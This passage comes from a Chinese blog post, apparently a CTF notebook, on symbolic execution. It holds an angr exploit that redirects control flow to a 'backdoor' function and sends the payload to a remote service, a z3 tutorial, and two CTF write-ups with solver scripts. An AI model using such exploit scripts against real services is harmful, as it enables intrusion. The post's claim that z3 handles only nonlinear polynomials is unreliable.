class_">ReplacementInputVal</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        self.state.regs.rax = getBVV(self.state, <span class="number">4</span>, <span class="string">&#x27;int&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReplacementInit</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line">p.hook_symbol(<span class="string">&quot;_Z5fksthPKcS0_&quot;</span>, ReplacementCheckEquals())</span><br><span class="line">p.hook_symbol(<span class="string">&quot;_Z10input_linePcm&quot;</span>, ReplacementCheckInput())</span><br><span class="line">p.hook_symbol(<span class="string">&quot;_Z9input_valv&quot;</span>, ReplacementInputVal())</span><br><span class="line">p.hook_symbol(<span class="string">&quot;_Z4initv&quot;</span>, ReplacementInit())</span><br><span class="line">enter = p.factory.entry_state()</span><br><span class="line">enter.<span class="built_in">globals</span>[<span class="string">&#x27;symbols_count&#x27;</span>] = <span class="number">0</span></span><br><span class="line">simgr = p.factory.simgr(enter, save_unconstrained=<span class="literal">True</span>)</span><br><span class="line">d = simgr.explore()</span><br><span class="line">backdoor = p.loader.find_symbol(<span class="string">&#x27;_Z8backdoorv&#x27;</span>).rebased_addr</span><br><span class="line"><span class="keyword">for</span> state <span class="keyword">in</span> d.unconstrained:</span><br><span class="line">    bindata = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    rsp = state.regs.rsp</span><br><span class="line">    next_stack = state.memory.load(rsp, <span class="number">8</span>, endness=p.arch.memory_endness)</span><br><span class="line">    state.add_constraints(state.regs.rip == ret_rop)</span><br><span class="line">    state.add_constraints(next_stack == backdoor)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(state.<span class="built_in">globals</span>[<span class="string">&#x27;symbols_count&#x27;</span>]):</span><br><span class="line">        s, s_type = state.<span class="built_in">globals</span>[<span class="string">&#x27;s_&#x27;</span> + <span class="built_in">str</span>(i)]</span><br><span class="line">        <span class="keyword">if</span> s_type == <span class="string">&#x27;str&#x27;</span>:</span><br><span class="line">            bb = state.solver.<span class="built_in">eval</span>(s, cast_to=<span class="built_in">bytes</span>)</span><br><span class="line">            <span class="keyword">if</span> bb.count(<span class="string">b&#x27;\x00&#x27;</span>) == <span class="built_in">len</span>(bb):</span><br><span class="line">                bb = <span class="string">b&#x27;A&#x27;</span> * bb.count(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            bindata += bb</span><br><span class="line">        <span class="keyword">elif</span> s_type == <span class="string">&#x27;int&#x27;</span>:</span><br><span class="line">            bindata += <span class="built_in">str</span>(state.solver.<span class="built_in">eval</span>(s, cast_to=<span class="built_in">int</span>)).encode(<span class="string">&#x27;ASCII&#x27;</span>) + <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(bindata)</span><br><span class="line">    r.send(bindata)</span><br><span class="line">    r.interactive()</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>首先是一些预操作,接着是对四个函数进行hook,防止路径爆炸或其他?</p><p>获得unconstrained,然后这个乍一看怪怪的</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(state.<span class="built_in">globals</span>[<span class="string">&#x27;symbols_count&#x27;</span>]):</span><br><span class="line">    s, s_type = state.<span class="built_in">globals</span>[<span class="string">&#x27;s_&#x27;</span> + <span class="built_in">str</span>(i)]</span><br></pre></td></tr></table></figure><p>这里了解一个知识</p><p><strong><code>state.globals.__dict__</code></strong>是一个字典,里面又有一个字典<code>_backer</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.unconstrained[<span class="number">0</span>].<span class="built_in">globals</span>.__dict__</span><br><span class="line">&#123;<span class="string">&#x27;state&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;_backer&#x27;</span>: &#123;<span class="string">&#x27;symbols_count&#x27;</span>: <span class="number">17</span>, <span class="string">&#x27;s_0&#x27;</span>: (&lt;BV32 s_0_51_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_1&#x27;</span>: (&lt;BV32 s_1_52_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_2&#x27;</span>: (&lt;BV32 s_2_53_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_3&#x27;</span>: (&lt;BV32 s_3_54_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_4&#x27;</span>: (&lt;BV32 s_4_56_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_5&#x27;</span>: (&lt;BV32 s_5_57_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_6&#x27;</span>: (&lt;BV32 s_6_58_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_7&#x27;</span>: (&lt;BV32 s_7_59_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_8&#x27;</span>: (&lt;BV392 s_8_64_392&gt;, <span class="string">&#x27;str&#x27;</span>), <span class="string">&#x27;s_9&#x27;</span>: (&lt;BV32 s_9_74_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_10&#x27;</span>: (&lt;BV32 s_10_80_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_11&#x27;</span>: (&lt;BV32 s_11_85_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_12&#x27;</span>: (&lt;BV32 s_12_92_32&gt;, <span class="string">&#x27;int&#x27;</span>), <span class="string">&#x27;s_13&#x27;</span>: (&lt;BV248 s_13_116_248&gt;, <span class="string">&#x27;str&#x27;</span>), <span class="string">&#x27;s_14&#x27;</span>: (&lt;BV296 s_14_160_296&gt;, <span class="string">&#x27;str&#x27;</span>), <span class="string">&#x27;s_15&#x27;</span>: (&lt;BV448 s_15_230_448&gt;, <span class="string">&#x27;str&#x27;</span>), <span class="string">&#x27;s_16&#x27;</span>: (&lt;BV464 s_16_379_464&gt;, <span class="string">&#x27;str&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>里面有着<code>symbols_count</code>对应着全部的键值对数量</p><p>以及这样的键值对<code>s_num:(var,type)</code>,代表的是<u>从初始状态到该状态</u>所有出现的符号,<u>num代表的是出现的顺序</u></p><p>那么wp就明朗了没啥好说的,将符号转为字节串payload就是了</p><h1 id="约束求解"><a href="#约束求解" class="headerlink" title="约束求解"></a>约束求解</h1><p>约束求解用于解决一组条件的问题，这些条件通常被称为约束，其目的是找到满足这些约束的变量值。</p><p>在程序分析中，约束求解通常与符号执行相结合使用。符号执行是一种用符号变量代替具体值的执行技术，它可以在不实际执行程序的情况下探索程序路径，并生成关于程序行为的约束。约束求解器则负责解决这些约束，以确定符号变量可能的取值，从而确定程序执行的路径或找到输入数据的有效值。</p><p>约束求解在以下情况下特别有用：</p><ol><li><strong>程序分析</strong>：通过符号执行和约束求解，可以发现程序中的漏洞、逻辑错误或安全问题。</li><li><strong>自动化测试</strong>：使用符号执行和约束求解来生成输入数据，以覆盖代码中的不同执行路径，从而进行自动化测试。</li><li><strong>逆向工程</strong>：在逆向工程中，约束求解可以帮助分析者理解程序的行为，并识别关键的代码路径。</li><li><strong>二进制分析</strong>：在分析二进制文件时，约束求解可以帮助分析者理解程序逻辑，并发现关键功能。</li></ol><p>约束求解器的实现通常涉及各种技术和算法，包括基于SAT（可满足性问题）的方法、基于SMT（可满足性模理论）的方法以及其他启发式和优化算法。</p><p>下面介绍一下微软开发的z3约束求解器</p><h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><p>z3是一个十分强大的约束求解器,支持众多功能</p><h3 id="类型变量"><a href="#类型变量" class="headerlink" title="类型变量"></a>类型变量</h3><p>z3中有3中类型的变量，分别是整型(Int),实型(Real)和向量(BitVec)</p><p>Int-整数型</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)<span class="comment">#声明单个整型变量</span></span><br><span class="line">a,b = Ints(<span class="string">&#x27;a b&#x27;</span>)<span class="comment">#声明多个整型变量</span></span><br></pre></td></tr></table></figure><p>Real-实数型</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a = Real(<span class="string">&#x27;a&#x27;</span>)<span class="comment">#声明单个实型变量</span></span><br><span class="line">a,b = Reals(<span class="string">&#x27;a b&#x27;</span>)<span class="comment">#声明多个实型变量</span></span><br></pre></td></tr></table></figure><p>BitVec-向量</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a = BitVec(<span class="string">&#x27;a&#x27;</span>,<span class="number">8</span>) <span class="comment">#声明单个8位的变量</span></span><br><span class="line">a, b = BitVec(<span class="string">&#x27;a b&#x27;</span>,<span class="number">8</span>)<span class="comment">#声明多个8位的变量</span></span><br></pre></td></tr></table></figure><h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><p><strong>0x1简单约束求解</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a,b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>solve(a&gt;<span class="number">6</span>,b&lt;<span class="number">10</span>,a*b-<span class="number">1</span>==<span class="number">48</span>)</span><br><span class="line">[a = <span class="number">49</span>, b = <span class="number">1</span>]</span><br></pre></td></tr></table></figure><p><strong>0x2多条件条件约束器</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a,b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br><span class="line">solver = Solver()<span class="comment">#创建一个求解器对象</span></span><br><span class="line">solver.add(a+b==<span class="number">10</span>)<span class="comment">#用add方法添加约束条件</span></span><br><span class="line">solver.add(a-b==<span class="number">6</span>)</span><br><span class="line"><span class="keyword">if</span> solver.check() == sat: <span class="comment">#check()方法用来判断是否有解，sat(satisify)表示满足有解</span></span><br><span class="line">    ans = solver.model() <span class="comment">#model()方法得到解</span></span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    <span class="comment">#也可以用变量名作为下标得到解</span></span><br><span class="line">    <span class="built_in">print</span>(ans[a])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no ans!&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>0x3表达式简化</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x=Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y=Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (simplify(x + y + <span class="number">2</span>*x + <span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span> (simplify(x &lt; y + x + <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span> (simplify(And(x + <span class="number">1</span> &gt;= <span class="number">3</span>, x**<span class="number">2</span> + x**<span class="number">2</span> + y**<span class="number">2</span> + <span class="number">2</span> &gt;= <span class="number">5</span>)))</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3</span> + <span class="number">3</span>*x + y</span><br><span class="line">Not(y &lt;= -<span class="number">2</span>)</span><br><span class="line">And(x &gt;= <span class="number">2</span>, <span class="number">2</span>*x**<span class="number">2</span> + y**<span class="number">2</span> &gt;= <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p><strong>0x4表达式分析</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x = Int(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y = Int(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">n = x + y &gt;= <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;num args: &quot;</span>, n.num_args())</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;children: &quot;</span>, n.children())</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;1st child:&quot;</span>, n.arg(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;2nd child:&quot;</span>, n.arg(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;operator: &quot;</span>, n.decl())</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;op name:  &quot;</span>, n.decl().name())</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">num args:  <span class="number">2</span></span><br><span class="line">children:  [x + y, <span class="number">3</span>]</span><br><span class="line">1st child: x + y</span><br><span class="line">2nd child: <span class="number">3</span></span><br><span class="line">operator:  &gt;=</span><br><span class="line">op name:   &gt;=</span><br></pre></td></tr></table></figure><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><p>z3只适用于求解非线性多项式</p><p>像这样的就无法求解</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = Real(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Solver()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.add(<span class="number">2</span>**x == <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> (s.check())</span><br><span class="line">unknown</span><br></pre></td></tr></table></figure><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><h3 id="2020De1ta-code-runner"><a href="#2020De1ta-code-runner" class="headerlink" title="2020De1ta-code_runner"></a>2020De1ta-code_runner</h3><p>这题一开始有一个sha256爆破,之后才能拿到二进制文件,这里直接从二进制文件分析开始</p><p>这是个mipsel架构的文件</p><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// $a0 OVERLAPPED</span></span><br><span class="line">  __int64 v4; <span class="comment">// $a2 OVERLAPPED</span></span><br><span class="line">  __int64 v6; <span class="comment">// [sp+28h] [+28h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">v7</span>;</span> <span class="comment">// [sp+3Ch] [+3Ch] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">v8</span>;</span> <span class="comment">// [sp+44h] [+44h] BYREF</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v9[<span class="number">64</span>])(_DWORD, _DWORD, _DWORD, _DWORD); <span class="comment">// [sp+4Ch] [+4Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  gettimeofday(&amp;v7, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">  sub_401BA4();</span><br><span class="line">  <span class="keyword">if</span> ( sub_401C6C() )</span><br><span class="line">  &#123;</span><br><span class="line">    gettimeofday(&amp;v8, <span class="number">0</span>);</span><br><span class="line">    v6 = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">1000000</span> * (v8.tv_sec - v7.tv_sec) + v8.tv_usec - v7.tv_usec);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;======== %lld.%llds ========\n&quot;</span>, v6 / <span class="number">1000000</span>, v6 % <span class="number">1000000</span>);</span><br><span class="line">    sub_401D48(v6, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your time comes.\n&gt; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(v6 / <span class="number">100000</span>) &lt; <span class="number">0xD</span> )</span><br><span class="line">      read(<span class="number">0</span>, v9, <span class="number">-4</span> * (v6 / <span class="number">100000</span>) + <span class="number">52</span>);</span><br><span class="line">    v9[<span class="number">0</span>](v3, HIDWORD(v3), v4, HIDWORD(v4));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在最后可以执行shellcode,观察到前面的时间计算,显然是限制需要在一定时间内完成某些挑战</p><p>在sub_401C6C()函数里有一大坨套娃函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401C6C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">256</span>]; <span class="comment">// [sp+1Ch] [+1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Faster &gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="keyword">return</span> sub_401A9C((<span class="type">int</span>)v1);</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_400B30</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">3221338814</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终需要满足各种条件到达sub_400B30()</p><p>序会先读取0x100的输入，然后对这个输入做一系列的验证，只有通过所有验证函数才可以返回一个非零值。这些验证函数，每一个函数处理4字节的输入，然后如果此4字节通过验证，会调用另一个函数再去处理接下来的4字节；如果此4字节没有通过验证，则直接返回0。这种模式我们称之为线性，也就是说一旦有4字节的输入不正确，接下来的所有输入都不会被验证。</p><p>线性模式的解题利器就是angr,一段不做任何优化处理的脚本可以是</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p = angr.Project(<span class="string">&quot;real_code&quot;</span>)</span><br><span class="line">state = p.factory.blank_state(addr=<span class="number">0x401e88</span>)</span><br><span class="line">sm = p.factory.simgr(state)</span><br><span class="line">sm.explore(find=<span class="number">0x400b30</span>)</span><br><span class="line"><span class="comment"># 0x400b30为最内层return非零值的汇编指令</span></span><br><span class="line"><span class="built_in">print</span>(sm.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>之后好像有点复杂,先摸了</p><h3 id="DEFCAMP2017-forgot-my-key"><a href="#DEFCAMP2017-forgot-my-key" class="headerlink" title="DEFCAMP2017-forgot_my_key"></a>DEFCAMP2017-forgot_my_key</h3><p>给了这么一个加密函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_encrypt</span>(<span class="params"><span class="variable">$flag</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">  <span class="variable">$message</span> = <span class="variable">$flag</span> . <span class="string">&quot;|&quot;</span> . <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$encrypted</span> = <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">126</span>));</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$message</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$encrypted</span> .= <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$message</span>[<span class="variable">$i</span>]) + <span class="title function_ invoke__">ord</span>(<span class="variable">$key</span>[<span class="variable">$i</span> % <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>)]) + <span class="title function_ invoke__">ord</span>(<span class="variable">$encrypted</span>[<span class="variable">$i</span>])) % <span class="number">126</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$hexstr</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;h*&#x27;</span>, <span class="variable">$encrypted</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">array_shift</span>(<span class="variable">$hexstr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密串每一位都与明文、key、和加密串的前一位相关。但是由于第一位是随机出来的，所以很难从开头递推出来。</p><p>但是细心观察 message 的构成又可以发现，后面 32 位是 key 的 md5 串，倒数第 33 位又是已知，因此从这里就可以打开突破口。整理思路如下：</p><ul><li>第一步：通过倒数第 33 位明文已知，且密文已知，因此可以求得某一位 md5($key) 的值。</li><li>第二步：根据上一步推出来的值，又可以进一步推另一位 message 的值。如此往复下去，最终应该能找到所有的值。</li></ul><p>首先题目肯定保证了答案的唯一性，因此 Z3 求解成功就会得到 flag 无疑</p><p>其次，我们根据题目的变换方式，给 Z3 所有的正推关系式，把逆推的逻辑让 Z3 通过约束求解来完成，由于逆推可以一步步进行，因此也不会导致 Z3 复杂度爆炸求解不出来</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;5616f5962674d26741d2810600a6c5647620c4e3d2870177f09716b2379012c342d3b584c5672195d653722443f1c39254360007010381b721c741a532b03504d2849382d375c0d6806251a2946335a67365020100f160f17640c6a05583f49645d3b557856221b2&#x27;</span></span><br><span class="line"></span><br><span class="line">encrypted = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">    encrypted.append(binascii.unhexlify(s[i+<span class="number">1</span>] + s[i])[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;message len:&#x27;</span>, <span class="built_in">len</span>(encrypted)-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(encrypted)</span><br><span class="line"><span class="comment"># 声明变量，encrypted 是已知，因此 IntVal 即可</span></span><br><span class="line">encrypted = [IntVal(i) <span class="keyword">for</span> i <span class="keyword">in</span> encrypted]</span><br><span class="line">message = [Int(<span class="string">&#x27;flag%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted)-<span class="number">1</span>)]</span><br><span class="line"><span class="comment"># 创建一个求解器，求解全靠它</span></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">ml = <span class="built_in">len</span>(encrypted) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加明文字符的约束条件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ml):</span><br><span class="line">    <span class="keyword">if</span> i == ml - <span class="number">33</span>:</span><br><span class="line">        solver.add(message[i] == <span class="built_in">ord</span>(<span class="string">&#x27;|&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 肯定是可见字符，因此限定范围如下</span></span><br><span class="line">        solver.add(message[i] &lt; <span class="number">127</span>)</span><br><span class="line">        solver.add(message[i] &gt;= <span class="number">32</span>)</span><br><span class="line"><span class="comment"># 添加明文和密文对照关系的约束条件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ml):</span><br><span class="line">    solver.add(encrypted[i+<span class="number">1</span>] == (message[i] + message[ml-<span class="number">32</span>+i%<span class="number">32</span>] + encrypted[i]) % <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    m = solver.model()</span><br><span class="line">    s = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ml):</span><br><span class="line">        s.append(m[message[i]].as_long())</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(s))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;unsat&#x27;</span>) </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">=|=</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="符号执行" scheme="https://ixout.github.io/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
